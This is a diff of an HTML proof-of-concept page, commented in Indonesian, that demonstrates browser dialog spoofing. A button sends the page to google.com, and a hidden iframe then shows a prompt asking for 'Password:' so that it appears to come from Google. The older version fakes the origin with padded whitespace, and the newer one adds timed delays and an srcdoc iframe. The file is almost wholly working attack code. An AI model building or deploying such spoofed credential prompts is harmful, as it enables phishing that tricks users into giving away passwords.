@@ -1,18 +1,42 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PoC</title>
+    <meta charset="utf-8" />
+    <title>PoC with delays</title>
     <script>
     function triggerIframe() {
-        var iframe = document.createElement('iframe');
-        document.location="http://www.google.com";
-        iframe.src = 'javascript:prompt("www.google.com says                                                                                                                                     Password:")';
-        iframe.style.display = 'none';
-        document.body.appendChild(iframe);
+        // Delay sebelum navigasi (ms)
+        var delayNavigate = 2000;      // 2 detik
+        // Delay sebelum membuat iframe dan memunculkan prompt (ms)
+        var delayBeforeIframe = 3500;  // 3.5 detik
+
+        // Navigasi setelah delayNavigate
+        setTimeout(function() {
+            document.location = "https://www.google.com";
+        }, delayNavigate);
+
+        // Buat iframe yang menjalankan prompt setelah delayBeforeIframe
+        setTimeout(function() {
+            var iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+
+            // Gunakan srcdoc untuk memasukkan skrip yang memanggil prompt.
+            // Escape baris baru dan tanda kutip sesuai kebutuhan.
+            iframe.srcdoc = '<!doctype html><html><head><meta charset="utf-8"></head><body>'
+                + '<script>'
+                + '  // dikasih sedikit delay di dalam iframe agar urutan lebih pasti'
+                + '  setTimeout(function(){'
+                + '    prompt("tes says\\n\\nPassword:");'
+                + '  }, 100);'
+                + '<\/script>'
+                + '</body></html>';
+
+            document.body.appendChild(iframe);
+        }, delayBeforeIframe);
     }
     </script>
 </head>
 <body>
-    <button onclick="triggerIframe()">Trigger</button>
+    <button onclick="triggerIframe()">Trigger (with delays)</button>
 </body>
 </html>
